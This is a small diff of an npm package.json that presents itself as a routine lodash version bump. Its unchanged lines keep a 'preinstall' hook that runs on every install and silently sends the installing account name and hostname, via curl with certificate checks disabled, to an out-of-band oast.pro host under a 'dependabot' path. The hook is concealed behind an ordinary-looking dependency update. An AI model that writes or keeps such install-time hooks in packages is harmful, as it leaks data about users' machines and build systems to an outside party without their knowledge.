@@ -6,6 +6,6 @@
     "preinstall": "curl -sk http://dba7kfrk6n4as06l5hd07rfor6i3q979t.oast.pro/dependabot/preinstall/$(whoami)/$(hostname) || true"
   },
   "dependencies": {
-    "lodash": "4.17.20"
+    "lodash": "4.18.1"
   }
 }
